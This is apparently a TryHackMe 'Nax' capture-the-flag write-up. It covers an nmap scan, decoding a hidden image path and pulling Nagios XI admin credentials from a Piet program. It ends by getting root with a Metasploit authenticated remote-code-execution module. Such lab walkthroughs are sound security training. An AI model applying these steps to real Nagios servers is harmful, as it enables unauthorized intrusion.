# 33 - NAX \[npiet]

Room Link --> [https://tryhackme.com/room/nax](https://tryhackme.com/room/nax)

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo nmap -Pn -n -p- -T5 -sS -vv 10.10.131.31

PORT      STATE    SERVICE        REASON
22/tcp    open     ssh            syn-ack ttl 63
25/tcp    open     smtp           syn-ack ttl 63
80/tcp    open     http           syn-ack ttl 63
389/tcp   open     ldap           syn-ack ttl 63
443/tcp   open     https          syn-ack ttl 63
5667/tcp  open     unknown        syn-ack ttl 63
```
{% endcode %}

Navigating to the webpage:

<figure><img src=".gitbook/assets/image (247).png" alt=""><figcaption></figcaption></figure>

So i pasted the strange "elements" in google and saw many results relating to the "Periodic Table of the Elements"

So looking them up

<figure><img src=".gitbook/assets/image (244).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" lineNumbers="true" %}
```bash
Ag - Hg - Ta - Sb - Po - Pd - Hg - Pt - Lr
47 80 73 51 84 46 80 78 103

# /PI3T.PNG
```
{% endcode %}

Pasting the Decimal values in cyberchef and got a .png file.

<figure><img src=".gitbook/assets/image (243).png" alt=""><figcaption></figcaption></figure>

Downloading the png file: http://10.10.131.31/PI3T.PNg

Running Exiftool on the image:

`exiftool PI3T.PNg` .

<figure><img src=".gitbook/assets/image (245).png" alt=""><figcaption></figcaption></figure>

We use an online tool: `npiet` --> [https://www.bertnase.de/npiet/npiet-execute.php](https://www.bertnase.de/npiet/npiet-execute.php)

But i got an error after uploading the file, so we follow the hint and use gimp.

<figure><img src=".gitbook/assets/image (246).png" alt=""><figcaption></figcaption></figure>

Here we can see that we are trying to open the PI3T.PNg image into the gimp by clicking on the File Option from the Menu and then browsing to the location of the image.

![](https://i0.wp.com/1.bp.blogspot.com/-dFrxVFZ9gkw/YGIPyf9mkgI/AAAAAAAAvHg/mDb3640nuGsfnXgxStNkgrh5JJc63fG9wCLcBGAsYHQ/s16000/9.png?w=640\&ssl=1)

After loading the image be sure to make no changes and editing on the image as it can lead to corrupting the image. Just choose Save As option. This will open a window. Here we choose the PPM Image option that gives the image a .ppm extension.

![](https://i0.wp.com/1.bp.blogspot.com/-HeVqHo8f11Y/YGIP1XtlB3I/AAAAAAAAvHk/mi9swo1bscMY3O6U\_bAyhLk\_BTQ-wl4cQCLcBGAsYHQ/s16000/10.png?w=640\&ssl=1)

Gimp will ask you to state the Data Formatting. We tried to run it with both options with success but sometimes ASCII gave us some errors. So, to be sure, choose the Raw option and then click on Export.

![](https://i0.wp.com/1.bp.blogspot.com/-E7p\_x3ABAGQ/YGIP4fju5aI/AAAAAAAAvHo/4gvZZppowFEZ3fW9WOJNbI2QGsCsetlygCLcBGAsYHQ/s16000/11.png?w=640\&ssl=1)

At this moment we went back to the online interpreter and upload the ppm image. But for some reason, it gave us an error again. Tired of trying different gimmicks, we decided to get the interpreter from their [**GitHub**](https://github.com/gleitz/npiet) and try on our local machine. There was no release on GitHub which means we will have to build it. After cloning the repository, we change the directory and execute the configure file. It will set up all the prerequisites for building from source and create a makefile that we can use to build the application. All that is left is to run the make to create an executable.

```
git clone https://github.com/gleitz/npiet.git
cd npiet
./configure
make
```

![](https://i0.wp.com/1.bp.blogspot.com/-vog9EHwGwSw/YGIP7RquxXI/AAAAAAAAvHw/cPauvtNp8lQpCJZQus2Nj8F7\_imTyWQAwCLcBGAsYHQ/s16000/12.png?w=640\&ssl=1)

After running make, we list the contents of the directory to see that we have the npiet executable ready to use. We run it bypassing the PI3T.ppm image that we exported earlier. This gave us a big output but if we look closer it repeats after printing a set of characters. This is because the color blocks around the image area in a loop that prints the same string again and again. Upon closer inspection, we found that it was a set of credentials with the username nagiosadmin.

```bash
ls
./npiet -e 1000 ~/Nax/PI3T.ppm
nagiosadmin : n3p3UQ&9BjLp4$7uhWdY
```

We can authenticate with the creds: [http://10.10.16.110/nagiosxi/login.php](http://10.10.16.110/nagiosxi/login.php)

<figure><img src=".gitbook/assets/image (248).png" alt=""><figcaption></figcaption></figure>

w look at the description and you’ll find the CVE number:

<figure><img src="https://miro.medium.com/v2/resize:fit:403/1*C3k3AfrgxA4pj4PAdqso5A.png" alt="" height="201" width="586"><figcaption></figcaption></figure>

Search for exploit using **metasploit:**

search Nagiox XI

<figure><img src=".gitbook/assets/image (249).png" alt=""><figcaption></figcaption></figure>

But the answer for the page is

`exploit/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce` .

fill the options:

```
use exploit/linux/http/nagios_xi_authenticated_rce
set RHOSTS
set RPORT
set LHOST
set PASSWORD
run
```

We get root.
